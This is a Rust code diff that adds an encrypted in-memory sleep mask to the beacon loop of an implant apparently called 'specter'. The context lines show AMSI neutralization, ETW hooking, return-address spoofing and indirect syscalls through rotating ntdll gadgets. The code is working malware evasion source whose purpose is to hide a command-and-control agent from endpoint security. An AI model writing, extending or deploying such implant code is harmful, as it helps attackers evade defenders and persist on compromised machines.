@@ -18,6 +18,7 @@ use specter_core::hwbp::Hooks;
 use specter_core::peb::{self, Peb};
 use specter_core::rng::XorShift64;
 use specter_core::sleep::sleep_with_jitter;
+use specter_core::sleepmask::SleepMaskParams;
 use specter_core::syscalls::{ms_to_delay_interval, pick_gadget};
 use specter_core::time::{filetime_to_unix_epoch, is_expired};
 
@@ -41,6 +42,8 @@ pub struct Instance {
     /// Return-address spoofing gadget (JMP [RBX] in a signed DLL),
     /// 0 = unavailable (calls go direct).
     pub retspoof_gadget: usize,
+    /// Encrypted sleep mask parameters; None = plain indirect sleep.
+    pub sleep_mask: Option<SleepMaskParams>,
     pub get_system_time_as_file_time: unsafe extern "system" fn(*mut u64),
     pub exit_thread: unsafe extern "system" fn(u32),
     pub rng: XorShift64,
@@ -164,6 +167,15 @@ unsafe fn bootstrap() -> Option<Instance> {
     // stack walks. Unavailable gadget = direct calls (non-fatal).
     let retspoof_gadget = crate::runtime::retspoof::resolve_gadget(kernel32).unwrap_or(0);
 
+    // Encrypted sleep mask: static bounds resolved once; the per-cycle
+    // fields (seed, gadget, interval) refresh every sleep. Discovery
+    // failure disables the mask — the beacon sleeps unencrypted rather
+    // than encrypting unknown bounds.
+    let mut sleep_mask = crate::runtime::sleepmask::build_params();
+    if let Some(ref mut mask) = sleep_mask {
+        mask.ssn = syscall_table.delay_ssn;
+    }
+
     // AMSI neutralization: hook now if amsi.dll is mapped, defer the rest
     // through loader notifications (Dr3 — the ETW hooks left it free).
     crate::runtime::amsi::install(peb, ntdll, &syscall_table, &mut etw_hooks);
@@ -198,6 +210,7 @@ unsafe fn bootstrap() -> Option<Instance> {
         syscalls: syscall_table,
         etw_hooks,
         retspoof_gadget,
+        sleep_mask,
         get_system_time_as_file_time: *(get_time_ptr as *const unsafe extern "system" fn(*mut u64)),
         exit_thread,
         rng,
@@ -248,24 +261,35 @@ pub unsafe fn main() -> ! {
             syscalls::exit_thread(instance.exit_thread);
         }
 
-        // Jittered sleep interval (phase 2 remainder: the encrypted sleep
-        // mask with heap/stack spoofing replaces the plain interval).
+        // Jittered sleep interval.
         let ms = sleep_with_jitter(config::SLEEP_MS, config::JITTER_MS, instance.rng.next_u32());
+        let interval = ms_to_delay_interval(ms);
 
         // Hell's Hall: a new gadget every cycle, so the syscall never
         // executes from the same ntdll address twice in a row.
         let g = pick_gadget(instance.syscalls.gadget_count, instance.rng.next_u32());
         let gadget = syscalls::gadget(&instance.syscalls, g);
+        let delay_ssn = instance.syscalls.delay_ssn;
+        let seed = instance.rng.next_u64();
 
-        // NtDelayExecution(Alertable = FALSE, DelayInterval = relative).
-        let mut interval = ms_to_delay_interval(ms);
-        let status = syscalls::indirect_syscall2(
-            instance.syscalls.delay_ssn,
-            gadget,
-            0,
-            &mut interval as *mut i64 as usize,
-        );
-        // A failing sleep is not fatal: keep the cycle going.
-        let _ = status;
+        if let Some(ref mut mask) = instance.sleep_mask {
+            // Encrypted sleep: the whole image goes through the keystream
+            // while the thread is inside NtDelayExecution.
+            mask.seed = seed;
+            mask.gadget = gadget as usize;
+            mask.interval = interval;
+            crate::runtime::sleepmask::spt_sleepmask(core::ptr::from_ref(mask) as usize);
+        } else {
+            // Plain indirect sleep (mask discovery failed).
+            let mut interval = interval;
+            let status = syscalls::indirect_syscall2(
+                delay_ssn,
+                gadget,
+                0,
+                &mut interval as *mut i64 as usize,
+            );
+            // A failing sleep is not fatal: keep the cycle going.
+            let _ = status;
+        }
     }
 }
